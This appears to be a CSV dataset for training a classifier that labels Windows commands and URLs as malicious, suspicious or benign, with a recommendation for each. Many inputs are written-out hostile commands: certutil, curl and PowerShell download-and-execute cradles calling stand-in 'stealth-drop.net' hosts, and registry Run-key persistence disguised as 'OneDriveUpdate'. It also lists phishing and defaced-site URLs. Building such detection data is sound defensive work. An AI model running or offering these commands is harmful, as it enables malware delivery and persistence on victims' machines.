input_text,target_text
analyze: certutil -urlcache -split -f http://cdn-malicious6.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious16.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious13.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious55.stealth-drop.net/init.ps1'))""","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: cmd.exe /c curl http://cdn-malicious61.stealth-drop.net/file.bat -o file.bat && start file.bat,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: certutil -urlcache -split -f http://cdn-malicious27.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious3.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: certutil -urlcache -split -f http://cdn-malicious1.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: certutil -urlcache -split -f http://cdn-malicious38.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious52.stealth-drop.net/init.ps1'))""","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: cmd.exe /c curl http://cdn-malicious12.stealth-drop.net/file.bat -o file.bat && start file.bat,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: mkdir C:\Logs\Q4,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
"analyze: powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious47.stealth-drop.net/init.ps1'))""","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: music.yahoo.com/luba/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: njtransit.com/sf/sf_servlet.srv?hdnPageAction=BusSchedulesTo,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
"analyze: powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious4.stealth-drop.net/init.ps1'))""","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: schtasks /query /fo LIST /v,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: http://www.kospel.pl/ru/produkty/kolektory-sloneczne.html,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: cmd.exe /c curl http://cdn-malicious73.stealth-drop.net/file.bat -o file.bat && start file.bat,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: certutil -urlcache -split -f http://cdn-malicious10.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: net localgroup administrators,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: http://fischereiverein.org/bildergalerie/category/42-faenge-juni-2010,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: echo 'Test complete' > test6.log,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
"analyze: powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious64.stealth-drop.net/init.ps1'))""","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: americasmiles.com/profiles/illinois/orland-park/dr-robert-l-tentler.php,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: echo 'Test complete' > test17.log,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: http://dyetr.com/index.php?option=com_content&view=article&id=73:8m&catid=39:yerel-hizmetici&Itemid=61,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: echo 'Test complete' > test32.log,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: notepad.exe,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: Get-Process | Where-Object { $_.CPU -gt 100 },"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: Get-Process | Where-Object { $_.CPU -gt 100 },"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: Get-Process | Where-Object { $_.CPU -gt 100 },"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: systeminfo > sysinfo_10.txt,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: mkdir C:\Logs\Q0,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: notepad.exe,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious71.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: systeminfo > sysinfo_29.txt,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: systeminfo > sysinfo_31.txt,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious18.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: absoluteastronomy.com/topics/Sports_in_Evansville,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: mkdir C:\Logs\Q5,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: schtasks /query /fo LIST /v,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
"analyze: powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious67.stealth-drop.net/init.ps1'))""","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: certutil -urlcache -split -f http://cdn-malicious5.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: certutil -urlcache -split -f http://cdn-malicious20.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: mkdir C:\Logs\Q34,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: sanjuan832.blogspot.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: echo 'Test complete' > test2.log,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: nme.com/news/lily-allen/45645,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: schtasks /query /fo LIST /v,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: echo 'Test complete' > test22.log,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: http://www.keve-kiserdo.hu/portal/index.php?option=com_content&view=category&layout=blog&id=38&Itemid=190&limitstart=30,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: http://www.twalogisticsltd.co.uk/component/mailto/index.html?tmpl=component&link=aHR0cDovL3d3dy50d2Fsb2dpc3RpY3NsdGQuY28udWsvbmV3cy8xMS81Ny1wYWxsZXQtbmV0d29ya3MtZ3JlZW4tc29sdXRpb25zLmh0bWw=,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: chacha.com/question/who-are-the-members-of-the-defiance%2C-oh-band-the-other-half,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: net localgroup administrators,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: systeminfo > sysinfo_35.txt,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: mkdir C:\Logs\Q12,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: en.wikipedia.org/wiki/Fred_Hartsook,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: certutil -urlcache -split -f http://cdn-malicious77.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious43.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: notepad.exe,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious48.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: systeminfo > sysinfo_38.txt,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: footballpakistan.com/2011/02/pakistan-malaysia-announce-squads-asian-qualifiers-2012-olympics/flag-of-malaysia/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: fanpix.net/gallery/john-agar-pictures.htm,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: cmd.exe /c curl http://cdn-malicious0.stealth-drop.net/file.bat -o file.bat && start file.bat,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: net localgroup administrators,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: notepad.exe,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: rootsweb.ancestry.com/~ilcook/rdata/orgs/msn_afam955.htm,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: cmd.exe /c curl http://cdn-malicious2.stealth-drop.net/file.bat -o file.bat && start file.bat,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: mkdir C:\Logs\Q30,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: schtasks /query /fo LIST /v,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: Get-Process | Where-Object { $_.CPU -gt 100 },"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: echo 'Test complete' > test24.log,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious9.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: systeminfo > sysinfo_36.txt,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: wowhead.com/item=42336/bloodstone-band,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: mkdir C:\Logs\Q23,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: kansascitybands.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: systeminfo > sysinfo_14.txt,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: mkdir C:\Logs\Q33,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious36.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: canada.com/montrealgazette/news/story.html?id=6bb87441-f489-404f-92be-70100340d06a,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: https://hollywoodlife.com/2015/05/11/blac-chyna-birthday-cyring-tyga-kylie-jenner-relationship/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: mkdir C:\Logs\Q19,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
"analyze: powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious46.stealth-drop.net/init.ps1'))""","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: lira-apartmani.com,Malicious - Phishing site designed to trick users into submitting sensitive information. Recommendation: Block the URL and inform users who may have accessed it.
analyze: Get-Process | Where-Object { $_.CPU -gt 100 },"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious21.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious23.stealth-drop.net/init.ps1'))""","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: notepad.exe,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: systeminfo > sysinfo_15.txt,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: certutil -urlcache -split -f http://cdn-malicious26.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious33.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious34.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: cmd.exe /c curl http://cdn-malicious72.stealth-drop.net/file.bat -o file.bat && start file.bat,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: certutil -urlcache -split -f http://cdn-malicious17.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: notepad.exe,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: certutil -urlcache -split -f http://cdn-malicious57.stealth-drop.net/stager.exe stager.exe && start stager.exe,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-malicious8.stealth-drop.net/payload.ps1')"" /f","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
"analyze: powershell -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://cdn-malicious69.stealth-drop.net/init.ps1'))""","Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: mkdir C:\Logs\Q18,"Benign - Non-threatening command used in file creation, documentation, or system queries. Recommendation: No action required."
analyze: reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,"Suspicious - Command may be used to inspect system state or escalate privileges, depending on user intent. Recommendation: Log use of system enumeration tools and verify context and privileges."
analyze: cmd.exe /c curl http://cdn-malicious66.stealth-drop.net/file.bat -o file.bat && start file.bat,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: baseball-reference.com/players/l/lerouch01.shtml,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: cmd.exe /c curl http://cdn-malicious76.stealth-drop.net/file.bat -o file.bat && start file.bat,"Malicious - Executes or stages remote scripts/binaries using trusted system utilities — a known tactic in malware delivery. Recommendation: Audit execution history, block suspicious URLs, and restrict use of tools like certutil and curl."
analyze: amextravelplanning.com/destinations/new-orleans,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: mylife.com/shawn-allenware,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: patrickbond.ca/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: florida.schooltree.org/public/Dick-Howser-Center-019094.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: linkedin.com/pub/nellie-wong/3/627/527,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: experiencefestival.com/a/Combat_Infantryman_Badge_-_Design/id/4938649,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: juniorhockey.com/players/search.php,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: frankspowersportsandequipment.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: books.google.com/books/about/Marguerite_Bourgeoys_and_Montreal_1640_1.html?id=MP2yafGDmGIC,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://www.bukitesveiki.lt/component/mailto/index.html?tmpl=component&link=aHR0cDovL3d3dy5idWtpdGVzdmVpa2kubHQvc3RyYWlwc25pYWktcHJhbmVzaW1haS8yNjYtdmFpa2FpLWlyLXNwb3J0YXM=,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: booked.net/hotels/canada/montreal/parc-jarry,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: zaposlitev.matkurja.com/en/directory/organizations/K/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://www.casasyapartamentosvacacionalesenmargarita.com/index.php?option=com_content&view=article&id=177:yaque-paradise&catid=37&Itemid=57&lang=es,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: http://appleid.apple.co.uk.cgi-bin.webobjects.myappleid.woa.verify8.id-app7.net/identify-customer=BGflCuxHa6LxlMvVVZxtkg9ANaYm19kRI5fjEPKx0bI9Ga0SBBcKGNYXk7Co5cfZK4gtjEj6zrWyecrv4wMa7ocVwZRmwkBfjSLF/,Malicious - Phishing site designed to trick users into submitting sensitive information. Recommendation: Block the URL and inform users who may have accessed it.
analyze: islamforhumanity.com/news_brief,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://copremon.com.br/cooperativa.html,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: letrs.indiana.edu/cgi/t/text/text-idx?c=wright2;cc=wright2;view=text;rgn=main;idno=wright2-1073,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: playbill.com/news/article/153226-Roman-Polanskis-God-of-Carnage-Film-Simply-Titled-Carnage-to-Open-New-York-Film-Festival,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: spoke.com/info/pYebDCF/Smith,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: stuffaboutnames.com/jessica/actors.htm,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: kansascity-hotels-mo.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://www.itapoatelhados.com.br/site/index.php?option=com_content&view=article&id=3&Itemid=8,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
analyze: fandango.com/oliverhardy/filmography/p30384,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: en.wikipedia.org/wiki/Steve_Lawson_(baseball),Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: makli.us/shira-lazar-0028/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: archiveshub.ac.uk/features/03021901.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: 9rank.com/militarybest.com,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: complexe-desjardins.foodpages.ca/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: megamediamagazine.nl/artiesten.php?l=d,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://img25.artxun.com/sdd/oldimg/5dfd/5dfd9487cd432542d710dd4f447462c4.jpg,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: impuls.cc/en/academy/tutors/bill-forman.html,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: tbaye.com/,Benign - Legitimate and publicly safe website with no known malicious behavior. Recommendation: No action required.
analyze: http://www.needleseyeindustries.com/index.php?option=com_virtuemart&page=shop.browse&category_id=44&Itemid=71,"Malicious - The website appears to be defaced, likely due to unauthorized access. Recommendation: Investigate server integrity and check for other signs of compromise."
